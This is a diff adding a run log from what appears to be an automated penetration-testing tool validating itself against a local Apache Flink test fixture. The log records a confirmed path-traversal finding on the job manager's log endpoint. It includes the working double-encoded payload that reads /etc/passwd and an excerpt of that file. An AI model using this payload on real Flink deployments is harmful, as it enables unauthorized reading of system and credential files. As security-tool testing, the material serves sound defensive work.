@@ -1,0 +1,61 @@
+
+==============================================================================
+PRE-FLIGHT
+==============================================================================
+Flink / -> HTTP 200; ANTHROPIC_API_KEY present: True
+TOOL_EXEC_MODE=local
+
+==============================================================================
+1. SOURCE INGESTION + DISCOVERY (wired Orchestrator step → ExploitTask)
+==============================================================================
+ingested files=4 coverage=partial tech=['Java']
+  entrypoint: ['GET'] route='/jobmanager/logs/:filename' handler=JobManagerCustomLogHandler params=['filename'] path_params=['filename']
+  call-site : file_read file_read() tainted_by='filename' guard=None @JobManagerCustomLogHandler.java:58
+  Δ: exposed conf=0.75 :: no guard on the capability call site — present but unconstrained (intent-gap)
+  reach: static_confirmed loc=path :: intra-function: request param 'filename' → file_read() sink in JobManagerCustomLogHandler (C:\Users\ptkva\OneDrive\Documents\clinkz\tests\fixtures\flink_jobmanager_logs\JobManagerCustomLogHandler.java:58)
+
+black-box: the ':filename' traversal is a framework path param, not a crawlable link/form → gray-box source is what surfaces it as an injection point
+  → ExploitTask: _test_lfi GET http://localhost:8081/jobmanager/logs/:filename
+      params=['filename'] locations={'filename': 'path'} carrier=['carry_path_segment_traversal_raw']
+
+==============================================================================
+2. PROOF — hand tasks to Exploit via the real run() handoff, run the pipeline
+==============================================================================
+exploit summary: Exploit phase complete. 2 tests run, 1 findings. By severity: {'high': 1}. 0 results recorded to KB.
+
+findings in state: 1  (file-read: 1)
+  [HIGH] Local File Inclusion in filename parameter  status=confirmed
+      • Request: GET http://localhost:8081/jobmanager/logs/:filename — filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+      • Response: matched /etc/passwd signature: root:x:0:0:
+      • phases_completed=6 verified=True strength=verified
+      • retrieval_type=direct_read
+      • primitives={'traversal_sequence': '%252e%252e%252f', 'wrapper_support': [], 'prefix_required': False, 'suffix_handling': 'appends_extension'}
+      • payload=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+      • indicator_type=file_signature
+      • expected_indicator=root:x:0:0:
+      • indicator_observed=matched /etc/passwd signature: root:x:0:0:
+      • confirmation=P3 target=GET http://localhost:8081/jobmanager/logs/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd (file read /etc/passwd) status=200
+      • internal_content_marker='root:x:0:0:' (content we never sent; control_reflected_it=False)
+      • confirming_excerpt: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/…
+
+==============================================================================
+3. ZERO-FP — reflection-in-error control (/taskmanagers/:id)
+==============================================================================
+  reflection-in-error control /taskmanagers/:id → 0 file-read findings (expect 0)
+
+==============================================================================
+REPORT + TRACE (raw artifact paths)
+==============================================================================
+engagement_id : 4cd5e101-ceb0-482e-83c1-ce6df4e08d1c
+report (json) : outputs\4cd5e101-ceb0-482e-83c1-ce6df4e08d1c\report_4cd5e101-ceb0-482e-83c1-ce6df4e08d1c.json
+report (md)   : outputs\4cd5e101-ceb0-482e-83c1-ce6df4e08d1c\report_4cd5e101-ceb0-482e-83c1-ce6df4e08d1c.md
+trace (jsonl) : C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\4cd5e101-ceb0-482e-83c1-ce6df4e08d1c\trace.jsonl
+
+==============================================================================
+VERDICT
+==============================================================================
+  FILE READ CONFIRMED in-band (P3, genuine)    : True
+  raw-auditable ConfirmationEvidence in finding: True
+  zero false positives (reflection control)    : True
+
+  RESULT: PASS
